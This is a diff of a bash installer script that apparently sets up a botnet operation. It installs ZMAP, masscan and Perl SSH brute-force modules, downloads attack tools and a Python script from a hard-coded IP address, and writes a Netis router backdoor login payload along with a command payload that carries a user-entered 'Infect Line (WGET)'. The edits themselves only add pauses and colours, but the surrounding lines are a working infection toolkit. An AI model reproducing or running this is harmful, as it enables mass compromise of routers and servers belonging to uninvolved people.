@@ -148,6 +148,9 @@ if [[ $answer == AWS ]]
 then
 clear
 echo -e ""
+
+sleep 1
+
 yum update -y
 
 yum install python-paramiko gcc screen nano wget httpd iptables perl -y
@@ -171,7 +174,9 @@ yum install epel-release -y
 yum install gengetopt -y
 
 echo -e "${LIGHTCYAN}Updates Installed.."
-echo -e "${LIGHTRED}Now installing ZMAP"
+sleep 1
+echo -e "${LIGHTRED}Now installing ZMAP${LIGHTGREEN}"
+sleep 1
 echo -e ""
 wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
 
@@ -196,7 +201,9 @@ make install
 cd
 
 echo -e "${LIGHTCYAN}ZMAP Finished Installing.."
-echo -e "${LIGHTRED}Now Installing NETSSH and Running Scanner.sh.."
+sleep 1.0
+echo -e "${LIGHTRED}Now Installing NETSSH and Running Scanner.sh..${LIGHTGREEN}"
+sleep 1.0
 echo -e ""
 yum install cpan wget curl glibc.i686 -y
 cpan force install Parallel::ForkManager
@@ -214,7 +221,9 @@ cpan force install Net::SSH2
 cd
 
 echo -e "${LIGHTCYAN}Finished!"
-echo -e "${LIGHTRED}Now Installing LRAB... "
+sleep 1.0
+echo -e "${LIGHTRED}Now Installing LRAB... ${LIGHTGREEN}"
+sleep 1.0
 echo -e ""
 wget -q http://74.91.115.32/class -O class
 
@@ -233,12 +242,18 @@ wget -q http://74.91.115.32/w.pl -O w.pl
 wget -q http://74.91.115.32/wget.pl -O wget.pl
 
 echo -e "${LIGHTCYAN}LRAB Finished Installing.."
+sleep 1.0
 echo -e "${LIGHTCYAN}WGET Files Finished Installing.."
-echo -e "${LIGHTRED}Now Installing MassScan.."
+sleep 1.0
+echo -e "${LIGHTRED}Now Installing MassScan..${LIGHTGREEN}"
+sleep 1.0
 echo -e ""
 wget -q http://74.91.115.32/masscan -O masscan
 echo -e "${LIGHTCYAN}Massscan finished installing.."
-echo -e "${LIGHTRED}Now Setting Up Netis Scanning"
+sleep 1.0
+echo -e "${LIGHTRED}Now Setting Up Netis Scanning${LIGHTGREEN}"
+sleep 1.0
+echo -e ""
 python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
 echo -e ""
 echo -e "${WHITE} Enter Infect Line (WGET):${LIGHTRED} \c"
@@ -246,9 +261,14 @@ read WGET
 clear
 echo -e ""
 python -c "print 'AA\x00\x00AAAA $WGET\x00'" > commandpayload
+
 echo -e "${LIGHTCYAN}Netis Setup Finished.."
-echo -e "${LIGHTRED}Now Downloading Files For Net.."
-wget -q http://74.91.115.32/cc7.py -O cc7.py 
+sleep 1.0
+echo -e "${LIGHTRED}Now Downloading Files For Net..${LIGHTGREEN}"
+sleep 1.0
+echo -e ""
+wget -q http://74.91.115.32/cc7.py -O cc7.py
+
 read
 fi
 if [[ $answer == CPAN ]]
